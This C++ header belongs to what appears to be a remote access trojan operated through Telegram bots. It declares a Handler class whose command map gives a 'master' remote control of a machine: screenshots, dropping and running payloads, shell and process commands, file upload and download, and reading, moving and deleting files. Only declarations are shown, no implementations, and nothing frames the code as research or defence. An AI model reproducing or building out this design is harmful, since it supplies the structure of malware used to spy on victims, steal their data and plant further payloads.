/*include/rat/Handler.hpp*/
#pragma once
#include "rat/handler/types.hpp"
#include "rat/ThreadPool.hpp"
#include "rat/tbot/tbot.hpp"
#include "rat/tbot/types.hpp"
#include "rat/networking.hpp"
#include <memory>
#include <string>
#include <array>
#include <vector>
#include <cstdint>
#include <mutex>


namespace rat::handler {

using ThreadPool_uPtr = std::unique_ptr<::rat::ThreadPool>;
using BaseBot_uPtr = std::unique_ptr<::rat::tbot::BaseBot>;
using Bot_uPtr = std::unique_ptr<::rat::tbot::Bot>;
using CurlClient_uPtr = std::unique_ptr<::rat::networking::Client>;

class Handler {
public:
    uint64_t master_id;
    Bot_uPtr bot;
    BaseBot_uPtr backing_bot;
    CurlClient_uPtr curl_client;

private:
    //the handler refrences the bot instead of owning it, they bot live inside the scope of the void botLoop(void) functions;
    ThreadPool_uPtr process_pool;
    ThreadPool_uPtr timer_pool;
    
    
    std::mutex curl_client_mutex; 
    std::mutex backing_bot_mutex;

    ::rat::handler::RatState state; //this is a refrence to a stack object;
    /*since now we have a backing bot we can use its curl_client*/ 

    ::rat::tbot::Update telegram_update;
    Command command;

    struct CommandHandler {
        std::string command;
        void (Handler::*handler)();
    };
    
    const std::array<CommandHandler, 19> command_map = {{
        {"/reset",        &Handler::handleResetCommand},
        {"/screenshot",   &Handler::handleScreenshotCommand},
        {"/drop",         &Handler::handleDropCommand},
        {"/process",      &Handler::parseAndHandleProcessCommand},
        {"/menu",         &Handler::handleMenuCommand},
        {"/download",     &Handler::handleDownloadCommand},
        {"/upload",       &Handler::handleUploadCommand},
        {"/pwd",          &Handler::handlePwdCommand},
        {"/cd",           &Handler::handleCdCommand},
        {"/ls",           &Handler::handleLsCommand},
        {"/read",         &Handler::handleReadCommand},
        {"/touch",        &Handler::handleTouchCommand},
        {"/get",          &Handler::handleGetCommand},
        {"/stat",         &Handler::handleStatCommand},
        {"/rm",           &Handler::handleRmCommand},
        {"/mv",           &Handler::handleMvCommand},
        {"/cp",           &Handler::handleCpCommand},
        {"/set",          &Handler::handleSetCommand},
        {"/help",         &Handler::handleHelpCommand}
    }};
    

  // Parse Telegram message to command
    void parseTelegramMessageToCommand(void);
    
  // Command handler methods
    void handleResetCommand();
    void handleScreenshotCommand();
    void handleDropCommand();
    void parseAndHandleShellCommand();
    void parseAndHandleProcessCommand();
    void handleHelpCommand();
    void handleMenuCommand();
    void handleMessageWithUploadedFiles();
    void handleDownloadCommand();
    void handleUploadCommand();
    void handlePwdCommand();
    void handleCdCommand();
    void handleLsCommand();
    void handleReadCommand();
    void handleTouchCommand();
    void handleGetCommand();
    void handleStatCommand();
    void handleRmCommand();
    void handleMvCommand();
    void handleCpCommand();
    void handleSetCommand();

    // Dispatchers - direct member function calls
    void dispatchIntegratedCommand();

    void dispatchDynamicCommand();

    void handlePayloadCommand(void);
    
public:
    explicit Handler() {
        this->state = {}; 
        this->telegram_update = {};
        this->command = {};
    };
    ~Handler() {};
    void setMasterId(uint64_t Master_Id);
    void initMainBot(const char* arg_Token);
    void initBackingBot(const char* arg_Token);
    void initCurlClient(uint8_t Operation_Restart_Bound = 5);
    void initThreadPools(uint8_t Number_Process_Threads = 1, uint8_t Number_Timer_Threads = 2);
    // Handle Telegram update
    void handleUpdate(rat::tbot::Update&& arg_Update);
     
};//class rat::handler::Handler

void   __normalizeWhiteSpaces(std::string& String_Input);
size_t __countWhiteSpaces(const std::string& String_Input);
size_t  __findFirstOccurenceOfChar(const std::string& Input_String, char arg_C);
uint16_t _stringToUint16(const std::string& str);
std::vector<std::string> splitArguments(const std::string& Input_String);
std::string stripQuotes(const std::string& Input_String);

} // namespace rat::handler


